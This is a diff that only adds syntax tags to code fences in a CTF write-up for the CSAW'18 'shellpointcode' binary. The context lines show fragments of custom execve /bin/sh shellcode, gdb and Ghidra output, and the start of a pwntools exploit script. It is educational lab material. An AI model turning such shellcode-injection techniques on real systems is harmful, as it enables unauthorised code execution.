@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    ./shellpointcode
 Linked lists are great!
 They let you chain pieces of data together.
@@ -34,7 +34,7 @@ $    pwn checksec shellpointcode
 
 So we can see that we are dealing with a 64 bit binary that has RWX segments (regions of memory that we can read, write, and execute). We can see that with gdb:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x /Hackery/pod/modules/crafting_shellcodePt1/csaw18_shellpointcode/shellpointcode
@@ -59,7 +59,7 @@ Start              End                Offset             Perm Path
 
  In addition to that when we run it, we see that it prompts us for three separate inputs and prints what appears to be a stack address. When we take a look at the main function in Ghidra we see this:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -73,7 +73,7 @@ undefined8 main(void)
 
 Here we can see it calls the `nononode` which does this:
 
-```
+```c
 void nononode(void)
 
 {
@@ -96,7 +96,7 @@ void nononode(void)
 
 Here we can see that it scans for input twice, in two `0xf` byte chunks. It then gives us a stack infoleak by printing out the address of `inp0Ptr` so we know where our first `0xf` byte chunk on the stack is. Then it calls the `goodbye` function which does this:
 
-```
+```c
 void goodbye(void)
 
 {
@@ -117,7 +117,7 @@ For writing the custom shellcode, we will be splitting up the shellcode into the
 
 
 block 0:
-```
+```objdump
   400080:    48 bf d1 9d 96 91 d0     movabs rdi,0xff978cd091969dd1
   400087:    8c 97 ff
   40008a:    e9 0c 00 00 00           jmp    40009b <_start+0x1b>
@@ -125,7 +125,7 @@ block 0:
 
 This block just executes two different instructions. The first just moves the hex string 0xff978cd091969dd1 (which is just the string /bin/sh\x00 noted) into the rdi register, and then calls the relative jump function. This will just jump x amount of instructions, where x is it's argument (which in this case it's 0xc, which is 12). To figure out how many instructions to jump, I examined the amount of instructions interpreted (since most data can be interpreted as an instruction, and our jmp call will) to see how many instructions I would need to jump ahead, and a bit of trial and error until I got it right. We can see where the shellcode will jump in gdb (will help a lot if you use a script in this part):
 
-```
+```gdb
 gef➤  search-pattern 0xd091969dd1bf48
 [+] Searching '0xd091969dd1bf48' in memory
 [+] In '[heap]'(0x55b195217000-0x55b195238000), permission=rwx
@@ -150,7 +150,7 @@ gef➤  x/5i 0x7ffcc0c50908
 Remember the relative jump opcode (0xe9) works off of the number instructions (which vary in bytes), not bytes.
 
 block1:
-```
+```objdump
   4000a8:    31 f6                    xor    esi,esi
   4000aa:    f7 e6                    mul    esi
   4000ac:    04 3b                    add    al,0x3b
@@ -163,7 +163,7 @@ block1:
 Here is the rest of the shellcode. It essentially just sets for the syscall which will give us a shell, then makes the syscall. All we really did with the shellcode was move around some of the instructions, and add a jmp instruction.
 
 Here is a look at the shellcode precompiled. The NOPs represent the space between the two segments,
-```
+```console
 $    cat shellcode.asm
 [SECTION .text]
 global _start
@@ -207,7 +207,7 @@ _start:
 
 and to compile the shellcode:
 
-```
+```console
 $    nasm -f elf64 shellcode.asm
 $    ld -o sheller shellcode.o
 $    objdump -D sheller -M intel
@@ -258,7 +258,7 @@ Disassembly of section .text:
 
 Putting it all together, we get the following exploit:
 
-```
+```python
 # Import pwntools
 from pwn import *
 
@@ -297,7 +297,7 @@ target.interactive('node.next: ')
 ```
 and when we run it:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './shellpointcode': pid 24064
 Linked lists are great!
